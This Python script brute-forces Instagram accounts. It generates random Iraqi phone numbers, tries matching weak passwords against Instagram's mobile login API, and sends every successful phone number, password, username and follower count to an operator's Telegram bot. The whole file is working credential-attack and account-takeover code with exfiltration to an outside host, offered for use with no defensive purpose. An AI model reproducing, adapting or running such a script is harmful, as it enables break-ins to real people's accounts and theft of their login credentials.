#!/usr/bin/python3 -B
try:
	import  os , sys , random, requests , time , json , secrets,uuid
	import subprocess
	from bs4 import BeautifulSoup
	from colorama import Fore as fore
	from secrets import token_hex
	from uuid import uuid4
	from time import sleep
 
except ImportError as e:
	sys.exit('[Error] ' + e + ' :-\\')
	
A = "\033[1;91m"
B = "\033[1;90m"
C = "\033[1;97m"
E = "\033[1;92m"
H = "\033[1;93m"
K = "\033[1;94m"
L = "\033[1;95m"


def psb(s):
	for ASU in s + '\n':
		sys.stdout.write(ASU)
		sys.stdout.flush()
		sleep(50. / 700)
		

def SidraELEzz(username,pas):
	
	content = requests.get('https://www.instagram.com/' + username,headers = {'User-agent': 'your bot 0.1'}).text
	source = BeautifulSoup(content, 'html.parser')
	description = source.find("meta", {"property": "og:description"}).get("content")
	info_list = description.split("-")[0]
	followers = info_list[0:info_list.index("Followers")]
	info_list = info_list.replace(followers + "Followers, ", "")
	following = info_list[0:info_list.index("Following")]
	info_list = info_list.replace(following + "Following, ", "")
	posts = info_list[0:info_list.index("Posts")]
	
	time.sleep(1)
	requests.post("https://api.telegram.org/bot"+token+"/sendMessage?chat_id="+ID+"&text=⁦\n\nE𝗆𝖺𝗂𝗅  :"+ Email+"\nPass  : "+ pas+"\nUser  : "+username+"\nFollwers : "+followers+"\nFoolowing : "+following+"\nPost : "+posts+"\n""\n\nAsra Checker")
#------------------------------------------------------------------------------------------------------------------------0



def main():
	os.system('clear')
	new = "0987654321"
	tt=time.asctime()
	r = requests.session()
	global token , ID , Email , start_msg , id_msg , Ok , Cp , Sk , pas , username
	token = input("Token : ")
	ID = input("ID : ")
	start_msg = r.post(f"https://api.telegram.org/bot{token}/sendMessage?chat_id={ID}&text=Start").json()
	id_msg	=(start_msg['result']["message_id"])
	print(E)
	os.system('clear')

	
	
	Ok = 0
	Cp = 0
	Sk = 0
	GHH = 0
	user11 = "0987654321"
	
	r = requests.Session()
	
	while True:
		user = str(''.join((random.choice(new) for i in range(8))))
		q = '+964'
		x = "77"
		Email = q+x+user
		pas = "0"+x+user
		url='https://b.i.instagram.com/api/v1/accounts/login/'
		headers = {
        'User-Agent': 'Instagram 113.0.0.39.122 Android (24/5.0; 515dpi; 1440x2416; huawei/google; Nexus 6P; angler; angler; en_US)',
        "Accept": "*/*",
        "Accept-Encoding": "gzip, deflate",
        "Accept-Language": "en-US",
        "X-IG-Capabilities": "3brTvw==",
        "X-IG-Connection-Type": "WIFI",
        "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
        'Host': 'i.instagram.com',
        'Connection': 'keep-alive'
}
		
		uid = uuid.uuid4()
		payload = { 
        'uuid': uid,
		'password': pas,
		'username': Email,
		'device_id': uid,
	    'from_reg': 'false',
	    '_csrftoken': 'missing',
		'login_attempt_countn': '0'}
		req = r.post(url,headers=headers,data=payload)
		if 'logged_in_user' in req.json():
			Ok+=1
			username =req.json()['logged_in_user']['username']
			SidraELEzz(username,pas)
			print(E+"Ok : "+Email+":"+pas+" /",GHH)
		elif '"message":"challenge_required","challenge"' in req.json():
			Cp+=1
			GHH += 1
			print(H+"Securty : "+Email+":"+pas+" /",GHH)
			
		else:
			Sk+=1

			
			
main()
